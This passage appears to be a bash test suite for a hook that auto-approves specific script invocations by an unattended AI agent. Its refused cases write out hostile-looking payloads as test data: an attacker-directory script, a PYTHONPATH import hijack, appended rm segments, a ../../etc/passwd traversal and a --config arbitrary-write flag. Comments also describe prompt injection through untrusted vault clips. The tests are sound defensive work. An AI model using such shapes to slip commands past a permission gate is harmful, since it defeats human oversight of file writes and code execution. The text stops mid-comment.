#!/usr/bin/env bash
# Smoke test for scripts/hooks/cadence-approve-engines.sh (HIMMEL-1682 S2a).
#
# Usage: bash scripts/hooks/test-cadence-approve-engines.sh
#
# Contract under test (mirrors auto-approve-safe-bash, inverted vs block-*):
#   * ALLOW → stdout contains "permissionDecision":"allow"  (engine granted)
#   * PASS  → no such decision on stdout                    (falls through to
#             the normal permission flow; the grant stays narrow)
#   The hook ALWAYS exits 0 and NEVER blocks/denies.
#
# The load-bearing cases for the S2a fix:
#   - the vault-lint engine IS granted under the cadence profile (the 04:00
#     permission-plea death fixed), in both the documented relative form and the
#     absolute Windows form the model emits from the vault cwd;
#   - a NON-enumerated command is still NOT granted (the test that keeps the
#     grant honest and narrow).
#
# Exit codes:
#   0 — all cases passed
#   1 — at least one case failed
# Single-quoted $ENGINE / $(…) / `…` below are deliberate literal test payloads.
# shellcheck disable=SC2016
set -uo pipefail

# grepq <text> [grep-args...] — a `grep -q` with NO pipeline. printf-into-`grep
# -q` is a pipefail trap (grep -q exits on first match → producer SIGPIPE →
# pipeline reports failed). A here-string is not a pipeline. (HIMMEL-1430.)
grepq() { local _t="$1"; shift; grep -q "$@" <<< "$_t"; }

HOOK="$(cd "$(dirname "$0")" && pwd)/cadence-approve-engines.sh"
[ -x "$HOOK" ] || chmod +x "$HOOK"

FAILED=0

ENG="marketplace/plugins/obsidian-triage/skills/vault-lint/vault_lint.py"
# HIMMEL-1682 CR round 2: the grant is ROOT-ANCHORED to the checkout the hook
# ships in, so the absolute fixtures must be derived from the hook's own
# location — not hardcoded to one operator's primary checkout, which also made
# these cases silently unrunnable from a worktree.
ROOT="$(cd "$(dirname "$HOOK")/../.." && pwd)"
if command -v cygpath >/dev/null 2>&1; then
    ROOT_MIXED=$(cygpath -m "$ROOT" 2>/dev/null || printf '%s' "$ROOT")
else
    ROOT_MIXED="$ROOT"
fi
ABS="${ROOT_MIXED}/${ENG}"
# shellcheck disable=SC1003 # '\\' is tr's two-char escape for one backslash
ABS_BS=$(printf '%s' "$ABS" | tr '/' '\\')
# A path with the RIGHT suffix under the WRONG root — the shape the root anchor
# exists to refuse.
ABS_WRONG_ROOT="C:/tmp/evil/${ENG}"

# HIMMEL-1682 leg-16: a real (existing, resolvable) directory to stand in for
# the vault root, so the trailing-arg containment tests below aren't tied to
# any one operator's actual vault path. Cleaned up alongside the other
# mktemp fixtures via the trap set further down.
VAULT_FIXTURE=$(mktemp -d "${TMPDIR:-/tmp}/cadence-vault.XXXXXX")
if command -v cygpath >/dev/null 2>&1; then
    VAULT_FIXTURE_MIXED=$(cygpath -m "$VAULT_FIXTURE" 2>/dev/null || printf '%s' "$VAULT_FIXTURE")
else
    VAULT_FIXTURE_MIXED="$VAULT_FIXTURE"
fi

j_bash() { printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$(printf '%s' "$1" | jq -Rs .)"; }
# Same as j_bash but also carries a top-level `.cwd` (HIMMEL-1682 leg-16) —
# the field arg_is_vault_safe containment-checks an absolute trailing arg
# against, mirroring the `.tool_input.cwd // .cwd` field the hook reads.
j_bash_cwd() { printf '{"tool_name":"Bash","tool_input":{"command":%s},"cwd":%s}' "$(printf '%s' "$1" | jq -Rs .)" "$(printf '%s' "$2" | jq -Rs .)"; }

# Returns ALLOW if the selected hook emitted an allow decision, else PASS.
decide_with_hook() {
    local selected_hook="$1" input="$2" out
    out=$(printf '%s' "$input" | bash "$selected_hook" 2>/dev/null)
    if grepq "$out" '"permissionDecision":"allow"'; then
        echo "ALLOW"
    else
        echo "PASS"
    fi
}
decide() { decide_with_hook "$HOOK" "$1"; }

assert() {
    local label="$1" expected="$2" actual="$3"
    if [ "$actual" = "$expected" ]; then
        echo "PASS $label ($actual)"
    else
        echo "FAIL $label — expected $expected, got $actual"
        FAILED=$((FAILED + 1))
    fi
}

# --- ALLOW: the enumerated vault-lint engine, in every form the model emits ---
# HIMMEL-1682 leg-16: the vault arg is now containment-checked (see below), so
# an absolute vault path must be paired with a matching `.cwd` — VAULT_FIXTURE
# stands in for "the vault the cadence session is running in".
assert "absolute engine path (win)"  ALLOW "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"${VAULT_FIXTURE_MIXED}\"" "$VAULT_FIXTURE_MIXED")")"
assert "backslash engine path (win)" ALLOW "$(decide "$(j_bash "python \"${ABS_BS}\" vault")")"
# HIMMEL-1973 regression: the EXACT shape the 2026-08-20 04:00 health leg
# emitted — Windows BACKSLASH absolute engine path AND a backslash ABSOLUTE
# vault arg, with the session cwd arriving in backslash form too (the cadence
# runner's `cd /d` leaves it that way). This hook grants that command
# byte-for-byte; the leg parked because the model routed it through the
# PowerShell TOOL, which no cadence hook matches — closed separately by
# cadence-deny-powershell.sh. Pin the shape so a future path-normalisation
# change cannot silently stop granting what the cadence actually emits.
# shellcheck disable=SC1003 # '\\' is tr's two-char escape for one backslash
VAULT_FIXTURE_BS=$(printf '%s' "$VAULT_FIXTURE_MIXED" | tr '/' '\\')
assert "HIMMEL-1973 08-20 shape: backslash engine + backslash vault + backslash cwd" ALLOW "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS_BS}\" \"${VAULT_FIXTURE_BS}\"" "$VAULT_FIXTURE_BS")")"
assert "python3 interpreter"         ALLOW "$(decide "$(j_bash "python3 \"${ABS}\" vault")")"
# HIMMEL-1682 leg-16 (codex-adv HIGH): trailing args are no longer
# unconstrained (see file header SAFETY MODEL point 6). A bare `$VAULT`
# variable reference is an unprovable literal — the hook cannot audit what
# the cadence's shell environment would expand it to — so it now falls
# through ungranted, same fail-safe rule already applied to the engine
# script token. This flips from the pre-fix ALLOW: that expectation was a
# direct symptom of the bug this round closes.
assert "variable vault arg (unprovable, now refused)" PASS "$(decide "$(j_bash 'python "'"${ABS}"'" "$VAULT"')")"
assert "flag after script"           ALLOW "$(decide "$(j_bash "python \"${ABS}\" --json vault")")"
assert "engine alone (no vault arg)" ALLOW "$(decide "$(j_bash "python \"${ABS}\"")")"
assert "cd && engine"                ALLOW "$(decide "$(j_bash "cd /himmel && python \"${ABS}\" vault")")"
assert "pushd && engine"             ALLOW "$(decide "$(j_bash "pushd /himmel && python \"${ABS}\" vault")")"

# --- PASS: the grant stays narrow (this is the test that keeps the fix honest) ---
assert "wrong script"                PASS "$(decide "$(j_bash 'python /tmp/evil.py vault')")"
# HIMMEL-1682 CR round 2 codex-1: the grant is anchored to THIS checkout's root.
# A tail-only match let `cd <attacker dir> && python marketplace/.../vault_lint.py`
# auto-allow an attacker's file; these three keep that hole closed.
assert "relative engine path (unanchored)"  PASS "$(decide "$(j_bash "python \"${ENG}\" \"vault\"")")"
assert "cd attacker-dir && relative engine" PASS "$(decide "$(j_bash "cd /tmp/evil && python \"${ENG}\" vault")")"
assert "right suffix, wrong root"           PASS "$(decide "$(j_bash "python \"${ABS_WRONG_ROOT}\" vault")")"
# A failed root resolver returns the empty string. Simulate that exact result in
# a temporary hook copy: without the empty-root guard, /<suffix> would grant.
EMPTY_ROOT_HOOK=$(mktemp "${TMPDIR:-/tmp}/cadence-approve-engines.XXXXXX")
SPACED_ROOT="${TMPDIR:-/tmp}/himmel spaced $$"
trap 'rm -f "$EMPTY_ROOT_HOOK"; rm -rf "$SPACED_ROOT" "$VAULT_FIXTURE"' EXIT
sed 's@^ENGINE_ROOT_POSIX=.*@ENGINE_ROOT_POSIX=""@' "$HOOK" > "$EMPTY_ROOT_HOOK"
assert "empty root anchor grants nothing" PASS "$(decide_with_hook "$EMPTY_ROOT_HOOK" "$(j_bash "python /${ENG} vault")")"

# HIMMEL-1682 S2b (panel finding codex-1, judge-verified AGREED, Important):
# a checkout under a SPACED directory must still grant when the (quoted)
# script path itself contains spaces — the naive whitespace tokenizer
# shatters a quoted-but-spaced path across multiple array elements, so
# norm_path never sees the full path unless the hook reassembles it first.
# Derive a spaced fixture root under the temp dir (mirrors the real repo
# layout closely enough for ENGINE_ROOT_POSIX's `cd .../.. && pwd` to
# resolve — only scripts/hooks/ needs to physically exist).
mkdir -p "$SPACED_ROOT/scripts/hooks"
# HIMMEL-1682 CR round 4: canonicalize SPACED_ROOT (cd && pwd) right after
# creating it. On macOS, TMPDIR ends with a trailing slash, so the naive
# "${TMPDIR:-/tmp}/himmel spaced $$" concatenation above leaves a literal
# "//" in SPACED_ROOT — but the hook derives ENGINE_ROOT_POSIX via
# `cd ... && pwd`, which normalizes that away. The exact string comparison
# in the hook then never matches, rejecting the spaced-checkout assertions
# below regardless of the fix under test. Canonicalize before deriving
# SPACED_ROOT_MIXED/SPACED_ABS from it so both sides compare equal.
SPACED_ROOT=$(cd "$SPACED_ROOT" && pwd)
cp "$HOOK" "$SPACED_ROOT/scripts/hooks/cadence-approve-engines.sh"
SPACED_HOOK="$SPACED_ROOT/scripts/hooks/cadence-approve-engines.sh"
if command -v cygpath >/dev/null 2>&1; then
    SPACED_ROOT_MIXED=$(cygpath -m "$SPACED_ROOT" 2>/dev/null || printf '%s' "$SPACED_ROOT")
else
    SPACED_ROOT_MIXED="$SPACED_ROOT"
fi
SPACED_ABS="${SPACED_ROOT_MIXED}/${ENG}"
assert "spaced checkout root, quoted script path" ALLOW "$(decide_with_hook "$SPACED_HOOK" "$(j_bash "python \"${SPACED_ABS}\" vault")")"
assert "spaced checkout root, cd wrapper + quoted script" ALLOW "$(decide_with_hook "$SPACED_HOOK" "$(j_bash "cd \"${SPACED_ROOT_MIXED}\" && python \"${SPACED_ABS}\" vault")")"
# Negative: an unterminated quote anywhere in the command must never grant —
# it fails closed at the top-level quote-balance scan before segment logic
# even runs, but the contract ("unterminated -> no grant") is exactly what
# the reassembly fix must never violate, so it stays covered here.
assert "unterminated quote in script path" PASS "$(decide_with_hook "$SPACED_HOOK" "$(j_bash "python \"${SPACED_ABS} vault")")"
# HIMMEL-1682 codex-1: an env prefix must NOT be skipped over. PYTHONPATH can
# shadow a stdlib module vault_lint.py imports, which is arbitrary code
# execution — so an env-prefixed invocation must fall through ungranted.
# HIMMEL-1682 CR r3: the negatives here and below (env-prefix, compound-rm,
# output-redirect, pipe) build from ${ABS}, not ${ENG}. A RELATIVE engine path
# is refused by the ROOT ANCHOR regardless of these rules, so an ${ENG} payload
# stays PASS even if the targeted rule is deleted (mutation-insensitive). ${ABS}
# makes each refusal attribute to the rule it claims to isolate.
assert "PYTHONPATH prefix (import hijack)" PASS "$(decide "$(j_bash "PYTHONPATH=/tmp python \"${ABS}\" vault")")"
assert "env-assign prefix not skipped"     PASS "$(decide "$(j_bash "FOO=bar python \"${ABS}\" vault")")"
assert "python -c code exec"         PASS "$(decide "$(j_bash 'python -c "print(1)"')")"
assert "python -m module"            PASS "$(decide "$(j_bash 'python -m http.server')")"
assert "cat (not python)"            PASS "$(decide "$(j_bash 'cat foo')")"
assert "node (not python)"           PASS "$(decide "$(j_bash 'node script.js')")"
assert "rm (not python)"             PASS "$(decide "$(j_bash 'rm foo')")"
assert "variable script (unprovable)" PASS "$(decide "$(j_bash 'python "$ENGINE" vault')")"
assert "compound with rm segment"    PASS "$(decide "$(j_bash "python \"${ABS}\" vault && rm foo")")"
assert "output redirect to file"     PASS "$(decide "$(j_bash "python \"${ABS}\" vault > out.txt")")"
# HIMMEL-1682 CR r3 nitpick: unquoted INPUT redirection must be rejected too,
# not just `>` — `< file` slips past a `>`-only filter (segment_is_engine
# ignores trailing tokens, so the redirect guard is the only thing that catches
# it). Built from ${ABS} so the refusal attributes to the redirect filter.
assert "input redirect from file"     PASS "$(decide "$(j_bash "python \"${ABS}\" vault < in.txt")")"
assert "heredoc with nav-like body"  PASS "$(decide "$(j_bash "python \"${ABS}\" vault <<cd"$'\n'"cd /tmp"$'\n'"cd")")"
assert "pipe to head segment"        PASS "$(decide "$(j_bash "python \"${ABS}\" vault | head")")"
assert "command substitution"        PASS "$(decide "$(j_bash 'python "$(pwd)/vault_lint.py" vault')")"
assert "non-Bash tool"               PASS "$(decide "$(printf '{"tool_name":"Read","tool_input":{"command":"%s"}}' "python ${ENG}")")"
# HIMMEL-1688 item 2 (codex-2 @ 88517e1b, deferred from S2a/S2b): a nav-only
# command has every segment engine-or-nav (vacuously true — there is no
# engine segment at all), so the old loop fell through to emit_allow with a
# false "vault-lint engine" reason. Requiring at least one segment to
# actually BE an enumerated engine closes this.
assert "bare cd (nav-only, no engine)" PASS "$(decide "$(j_bash "cd /tmp")")"
assert "cd && pushd (nav-only, no engine)" PASS "$(decide "$(j_bash "cd /tmp && pushd /himmel")")"

# HIMMEL-1682 CR round 5 Major (finding 1): path_is_rooted_engine must compare
# the POSIX form EXACTLY. Folding case on every platform let a case-mismatched
# POSIX path (a DIFFERENT file on a case-sensitive filesystem) collect the
# grant. ROOT is the hook's own POSIX root (derived the same way the hook
# derives ENGINE_ROOT_POSIX); flip the case of one path segment so the
# candidate is neither the exact POSIX root nor (since it still starts with
# "/", not a drive letter) the mixed-form root.
# HIMMEL-1682 CR r7 (Minor): flip the LAST path segment of ROOT, not a
# hardcoded "/himmel/" inner segment. ROOT comes from `cd ... && pwd` (no
# trailing slash), so on a checkout whose final dir is "himmel" the old
# `s@/himmel/@/Himmel/@` never matched, this took the SKIP branch, and the
# exact-case POSIX refusal below went unexercised on most machines. Flipping
# the last segment (basename + tr swapcase) runs the case in EVERY checkout;
# the SKIP branch now fires only when that segment has no letters to flip.
ROOT_LAST=$(basename "$ROOT")
ROOT_LAST_FLIPPED=$(printf '%s' "$ROOT_LAST" | tr '[:upper:][:lower:]' '[:lower:][:upper:]')
if [ "$ROOT_LAST_FLIPPED" = "$ROOT_LAST" ]; then
    echo "SKIP case-mismatch POSIX refusal — ROOT's last segment has no letters to flip ($ROOT)" >&2
else
    ROOT_CASE_MISMATCH="$(dirname "$ROOT")/${ROOT_LAST_FLIPPED}"
    ABS_POSIX_CASE_MISMATCH="${ROOT_CASE_MISMATCH}/${ENG}"
    assert "POSIX form, case-mismatched root -> refused" PASS "$(decide "$(j_bash "python \"${ABS_POSIX_CASE_MISMATCH}\" vault")")"
fi
# Sanity companion: the exact-case POSIX form (never exercised above, which
# only used the mixed/Windows form) must still be granted.
assert "POSIX form, exact case -> allowed" ALLOW "$(decide "$(j_bash "python \"${ROOT}/${ENG}\" vault")")"

# HIMMEL-1682 CR round 8 (panel codex-1, Important): on a POSIX host WITHOUT
# cygpath, the cygpath branch is skipped so ENGINE_ROOT_MIXED collapses to
# ENGINE_ROOT_POSIX — making the mixed-form case-insensitive compare a
# case-insensitive RE-compare of the POSIX path. That auto-allows a case-twin
# POSIX path naming a DIFFERENT file on a case-sensitive filesystem. Force the
# cygpath-less shape (MIXED==POSIX) directly in a hook copy — the same
# sed-a-temp-copy seam used for the empty-root case above — and assert a
# case-twin POSIX path is STILL refused. The `[ "$ENGINE_ROOT_MIXED" !=
# "$ENGINE_ROOT_POSIX" ] || return 1` guard in path_is_rooted_engine is what
# keeps it narrow; without that guard this assertion returns ALLOW (the bug).
CYGLESS_HOOK=$(mktemp "${TMPDIR:-/tmp}/cadence-approve-engines.XXXXXX")
trap 'rm -f "$EMPTY_ROOT_HOOK" "$CYGLESS_HOOK"; rm -rf "$SPACED_ROOT" "$VAULT_FIXTURE"' EXIT
sed 's@^\([[:space:]]*\)ENGINE_ROOT_MIXED=.*cygpath.*@\1ENGINE_ROOT_MIXED="$ENGINE_ROOT_POSIX"@' "$HOOK" > "$CYGLESS_HOOK"
if [ "$ROOT_LAST_FLIPPED" != "$ROOT_LAST" ]; then
    assert "cygpath-less root, case-twin POSIX path -> refused" PASS "$(decide_with_hook "$CYGLESS_HOOK" "$(j_bash "python \"${ABS_POSIX_CASE_MISMATCH}\" vault")")"
else
    echo "SKIP cygpath-less case-twin refusal — ROOT's last segment has no letters to flip ($ROOT)" >&2
fi

# HIMMEL-1682 CR round 5 Major (finding 2): a trailing bare `&` must not slip
# past as an empty segment the main loop skips — that let the shell run the
# granted engine detached in the background, defeating this PR's own
# run_in_background deny.
assert "trailing bare & backgrounds the engine -> refused" PASS "$(decide "$(j_bash "python \"${ABS}\" vault &")")"
assert "bare & mid-command before another cmd -> refused"  PASS "$(decide "$(j_bash "python \"${ABS}\" vault & rm foo")")"
# A quoted `&` inside an argument is not the shell background operator — the
# quote-aware scanner never reaches the unquoted-& branch for it, so it stays
# part of the segment and the engine call is still granted.
assert "quoted & inside an argument -> still allowed" ALLOW "$(decide "$(j_bash "python \"${ABS}\" \"vault & running\"")")"
# && (logical AND) is a distinct, pre-existing, unaffected code path.
assert "&& logical-AND still splits (unaffected)" PASS "$(decide "$(j_bash "python \"${ABS}\" vault && rm foo")")"

# HIMMEL-1682 leg-16 (codex-adv HIGH, judge-accepted): after this hook
# validated the interpreter + rooted engine path, it used to auto-approve
# EVERY remaining argument. In the cadence's own unattended threat model
# (prompt injection from untrusted vault clips), an injected trailing
# `--config <file>` reaches vault_lint.py, whose config-loaded report_path is
# join()'d without containment and opened "w" — an arbitrary user-writable
# file WRITE primitive riding the auto-allow. These cases cover the fix:
# every remaining token must now be a per-engine safe flag or a path that can
# only resolve inside the vault the session is running in.

# 1. engine + vault-root arg + a per-engine safe flag -> still ALLOW.
assert "vault-root arg + --json -> allowed" ALLOW "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"${VAULT_FIXTURE_MIXED}\" --json" "$VAULT_FIXTURE_MIXED")")"

# 2. engine + --config <file> -> NOT granted. This is the exact primitive the
# finding names: --config is excluded from flag_is_safe's vault-lint set.
assert "--config flag -> refused (arbitrary-write primitive)" PASS "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"${VAULT_FIXTURE_MIXED}\" --config /tmp/evil.json" "$VAULT_FIXTURE_MIXED")")"

# 3. engine + an absolute path arg OUTSIDE the vault -> NOT granted, even
# though it is a syntactically well-formed path and the session cwd DID
# resolve (so this isn't just the "no cwd" fail-safe case — it's a genuine
# containment miss).
assert "absolute foreign path arg -> refused" PASS "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"C:/tmp/evil/somewhere\"" "$VAULT_FIXTURE_MIXED")")"

# 4. engine + a `..` traversal arg -> NOT granted, regardless of cwd.
assert "../ traversal arg -> refused" PASS "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"../../etc/passwd\"" "$VAULT_FIXTURE_MIXED")")"

# 5. Real cadence invocation shapes must still work (the regression that
# matters — the cadence must not break). Per the vault-lint SKILL.md (step 2,
# marketplace/plugins/obsidian-triage/skills/vault-lint/SKILL.md), the
# documented invocation is `python "<engine>" "<vault>"` with no flags, where
# <vault> is the resolved vault root — either the explicit path or, absent
# one, the session cwd itself.
assert "SKILL.md canonical form, absolute vault == cwd -> allowed" ALLOW "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"${VAULT_FIXTURE_MIXED}\"" "$VAULT_FIXTURE_MIXED")")"
assert "SKILL.md canonical form, vault == \".\" (cwd-relative) -> allowed" ALLOW "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \".\"" "$VAULT_FIXTURE_MIXED")")"

# HIMMEL-1682 leg-16 round 2 (gate panel + codex-adv): a literal-looking
# RELATIVE trailing arg still passes arg_is_vault_safe's `..`/`$` checks but
# shell-EXPANDS outside the vault at runtime via tilde/brace/glob expansion.
# None of these must auto-allow -- they fall through to the normal
# permission flow, same as the pre-existing `$VAR` case above.
assert "tilde-expansion vault arg -> refused"  PASS "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"~/private-vault\"" "$VAULT_FIXTURE_MIXED")")"
assert "brace-expansion vault arg -> refused"  PASS "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"{a,b}\"" "$VAULT_FIXTURE_MIXED")")"
assert "glob (*) vault arg -> refused"         PASS "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"*.md\"" "$VAULT_FIXTURE_MIXED")")"
assert "glob ([...]) vault arg -> refused"     PASS "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${ABS}\" \"foo[0-9]\"" "$VAULT_FIXTURE_MIXED")")"

# --- HIMMEL-2124: harvest/triage/ig-media-enrich cadence engines + scoped
# gh-api read approval. Fixtures mirror the vault-lint ones above (ROOT /
# ROOT_MIXED / VAULT_FIXTURE_MIXED already derived).
HARVEST_ENG="marketplace/plugins/obsidian-triage/tools/harvest-clip-body-batch.py"
IS_THIN_ENG="marketplace/plugins/obsidian-triage/tools/is-thin-cli.mjs"
EVIDENCE_KIND_ENG="marketplace/plugins/obsidian-triage/tools/lib/evidence-kind.mjs"
DAILY_TIMELINE_ENG="marketplace/plugins/obsidian-triage/tools/daily-timeline.mjs"
IG_MEDIA_FETCH_ENG="marketplace/plugins/obsidian-triage/tools/ig-media-fetch.py"
ENSURE_DEPS_ENG="marketplace/plugins/obsidian-triage/tools/ensure-deps.sh"
# HIMMEL-2124 acceptance-leg gap (2026-08-26): the two X/reddit enrich rungs.
FXTWITTER_ENG="marketplace/plugins/obsidian-triage/tools/fxtwitter-enrich.mjs"
REDDIT_ENRICH_ENG="marketplace/plugins/obsidian-triage/tools/reddit-enrich.mjs"
HARVEST_ABS="${ROOT_MIXED}/${HARVEST_ENG}"
IS_THIN_ABS="${ROOT_MIXED}/${IS_THIN_ENG}"
EVIDENCE_KIND_ABS="${ROOT_MIXED}/${EVIDENCE_KIND_ENG}"
DAILY_TIMELINE_ABS="${ROOT_MIXED}/${DAILY_TIMELINE_ENG}"
IG_MEDIA_FETCH_ABS="${ROOT_MIXED}/${IG_MEDIA_FETCH_ENG}"
ENSURE_DEPS_ABS="${ROOT_MIXED}/${ENSURE_DEPS_ENG}"
FXTWITTER_ABS="${ROOT_MIXED}/${FXTWITTER_ENG}"
REDDIT_ENRICH_ABS="${ROOT_MIXED}/${REDDIT_ENRICH_ENG}"

# 1. Each new engine, granted with its documented interpreter + a per-engine
#    documented flag, rooted at this checkout, vault arg containment-checked
#    against a matching .cwd.
assert "harvest-clip-body-batch.py: python + --scan-only" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${HARVEST_ABS}\" --scan-only \"clip.md\"" "$VAULT_FIXTURE_MIXED")")"
assert "harvest-clip-body-batch.py: python3 + vault arg" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python3 \"${HARVEST_ABS}\" \"${VAULT_FIXTURE_MIXED}\" --dry-run" "$VAULT_FIXTURE_MIXED")")"
assert "harvest-clip-body-batch.py: uv run --python 3.12 python" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "uv run --python 3.12 python \"${HARVEST_ABS}\" --scan-only \"clip.md\"" "$VAULT_FIXTURE_MIXED")")"
assert "harvest-clip-body-batch.py: uv run (no --python) also matches" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "uv run python \"${HARVEST_ABS}\" --scan-only \"clip.md\"" "$VAULT_FIXTURE_MIXED")")"
# RETASK R2124A codex-3: match_uv_prefix's version check was digits-and-dots
# ONLY, so `.` and `..` (neither contains a non-digit-non-dot char) passed as
# a "version". Tightened to a real ^[0-9]+(\.[0-9]+)*$ shape.
assert "harvest-clip-body-batch.py: uv run --python . (dot version) -> refused" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "uv run --python . python \"${HARVEST_ABS}\" --dry-run" "$VAULT_FIXTURE_MIXED")")"
assert "harvest-clip-body-batch.py: uv run --python .. (dotdot version) -> refused" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "uv run --python .. python \"${HARVEST_ABS}\" --dry-run" "$VAULT_FIXTURE_MIXED")")"

# HIMMEL-2124 RETASK R2124A: ig-media-fetch.py's documented invocation is
# `PYTHONUTF8=1 uv run --python 3.12 python <script>` (commands/
# ig-media-enrich.md:88,132,178,183, README.md:118) -- the uv-run prefix and
# the single literal PYTHONUTF8=1 lead-in both had to widen to cover it.
assert "ig-media-fetch.py: full documented PYTHONUTF8=1 uv run shape" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "PYTHONUTF8=1 uv run --python 3.12 python \"${IG_MEDIA_FETCH_ABS}\" \"${VAULT_FIXTURE_MIXED}\" --limit 5" "$VAULT_FIXTURE_MIXED")")"
assert "ig-media-fetch.py: uv run without the env lead-in still matches" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "uv run --python 3.12 python \"${IG_MEDIA_FETCH_ABS}\" \"${VAULT_FIXTURE_MIXED}\"" "$VAULT_FIXTURE_MIXED")")"
assert "PYTHONUTF8=1 + uv run against vault_lint -> refused (wrong engine)" PASS \
    "$(decide "$(j_bash "PYTHONUTF8=1 uv run --python 3.12 python \"${ABS}\" vault")")"
assert "OTHERVAR=1 + uv run against ig-media-fetch.py -> refused (wrong var name)" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "OTHERVAR=1 uv run python \"${IG_MEDIA_FETCH_ABS}\" \"${VAULT_FIXTURE_MIXED}\"" "$VAULT_FIXTURE_MIXED")")"
assert "PYTHONUTF8=0 + uv run against ig-media-fetch.py -> refused (wrong value)" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "PYTHONUTF8=0 uv run python \"${IG_MEDIA_FETCH_ABS}\" \"${VAULT_FIXTURE_MIXED}\"" "$VAULT_FIXTURE_MIXED")")"
assert "PYTHONUTF8=1 before a BARE (non-uv) python -> refused" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "PYTHONUTF8=1 python \"${IG_MEDIA_FETCH_ABS}\" \"${VAULT_FIXTURE_MIXED}\"" "$VAULT_FIXTURE_MIXED")")"
assert "is-thin-cli.mjs: node + clip path" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "node \"${IS_THIN_ABS}\" \"clip.md\"" "$VAULT_FIXTURE_MIXED")")"
assert "evidence-kind.mjs: node + --type/--url/--tags" ALLOW \
    "$(decide "$(j_bash "node \"${EVIDENCE_KIND_ABS}\" --type research --url https://example.com --tags a,b")")"
assert "daily-timeline.mjs: node + --vault/--date" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "node \"${DAILY_TIMELINE_ABS}\" --vault \"${VAULT_FIXTURE_MIXED}\" --date 2026-08-26" "$VAULT_FIXTURE_MIXED")")"
assert "ig-media-fetch.py: python + --limit" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${IG_MEDIA_FETCH_ABS}\" \"${VAULT_FIXTURE_MIXED}\" --limit 5 --include-evidence" "$VAULT_FIXTURE_MIXED")")"
assert "ensure-deps.sh: bare bash invocation" ALLOW \
    "$(decide "$(j_bash "bash \"${ENSURE_DEPS_ABS}\"")")"

# HIMMEL-2124 acceptance-leg gap (2026-08-26): fxtwitter-enrich.mjs /
# reddit-enrich.mjs, each via its documented invocation (tools/README.md:60-62,
# 153-154 for fxtwitter; the reddit-enrich.mjs usage string for reddit).
assert "fxtwitter-enrich.mjs: node + --vault/--dry-run" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "node \"${FXTWITTER_ABS}\" --vault \"${VAULT_FIXTURE_MIXED}\" --limit 5 --dry-run" "$VAULT_FIXTURE_MIXED")")"
assert "reddit-enrich.mjs: node + --vault/--include-evidence" ALLOW \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "node \"${REDDIT_ENRICH_ABS}\" --vault \"${VAULT_FIXTURE_MIXED}\" --include-evidence" "$VAULT_FIXTURE_MIXED")")"

# 2. Same basename OUTSIDE the tools dir -> NOT approved (ROOT ANCHOR holds
#    for the new engines too, not just vault_lint).
assert "harvest-clip-body-batch.py: right suffix, wrong root -> refused" PASS \
    "$(decide "$(j_bash "python \"C:/tmp/evil/${HARVEST_ENG}\" vault")")"
assert "is-thin-cli.mjs: right suffix, wrong root -> refused" PASS \
    "$(decide "$(j_bash "node \"C:/tmp/evil/${IS_THIN_ENG}\" clip.md")")"
assert "ig-media-fetch.py: relative (unanchored) -> refused" PASS \
    "$(decide "$(j_bash "python \"${IG_MEDIA_FETCH_ENG}\" vault")")"
assert "fxtwitter-enrich.mjs: right suffix, wrong root -> refused" PASS \
    "$(decide "$(j_bash "node \"C:/tmp/evil/${FXTWITTER_ENG}\" --vault vault")")"

# HIMMEL-2124 acceptance-leg gap: excluded/unknown flag, and wrong-binary
# (python against a node-pinned .mjs suffix -- script_matches_engine's bin
# pinning must refuse it regardless of flag_is_safe).
assert "fxtwitter-enrich.mjs: unenumerated flag --scrape-config -> refused" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "node \"${FXTWITTER_ABS}\" --vault \"${VAULT_FIXTURE_MIXED}\" --scrape-config /tmp/evil.json" "$VAULT_FIXTURE_MIXED")")"
assert "reddit-enrich.mjs: python interpreter (wrong binary) -> refused" PASS \
    "$(decide "$(j_bash "python \"${REDDIT_ENRICH_ABS}\" --vault vault")")"

# 3. uv-run is scoped to harvest-clip-body-batch.py ONLY -- the same prefix
#    against vault_lint (a different python-bin engine) must NOT be granted.
assert "uv run against vault_lint (wrong engine) -> refused" PASS \
    "$(decide "$(j_bash "uv run --python 3.12 python \"${ABS}\" vault")")"

# 4. compound-command smuggling behind a new engine -> NOT approved (reuses
#    the same segment-split guard already covering vault_lint).
assert "harvest engine && rm segment -> refused" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${HARVEST_ABS}\" --dry-run && rm foo" "$VAULT_FIXTURE_MIXED")")"

# --- gh api scoped read approval (HIMMEL-2124, SAFETY MODEL point 7).
# RETASK R2124A (3rd review round): rewritten from a denylist (name each
# dangerous flag) to an ALLOWLIST (name each safe flag) after the denylist
